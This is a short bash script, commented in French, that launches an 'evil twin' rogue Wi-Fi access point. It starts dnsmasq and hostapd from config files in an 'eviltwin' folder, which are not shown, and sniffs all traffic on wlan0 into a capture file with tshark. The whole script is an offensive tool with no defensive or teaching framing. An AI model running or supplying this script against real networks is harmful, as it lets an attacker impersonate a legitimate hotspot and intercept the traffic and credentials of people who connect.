#!/bin/bash

int_reseau=wlan0

#----------------------------------DEMARRAGE DU ROGUE AP---------------------------------

#Ouvre un terminal pour le lecture des logs de dnsmasq
sudo xterm -hold -e sudo dnsmasq -d -C eviltwin/dnsmasq.conf &

#Ouvre un terminal pour le lecture des logs de hostapd
sudo xterm -hold -e sudo hostapd eviltwin/hostapd.conf &

#Ouvre un terminal pour afficher les logs concernant la  capture des paquets
tshark -i $int_reseau -w eviltwin/sniff.cap &
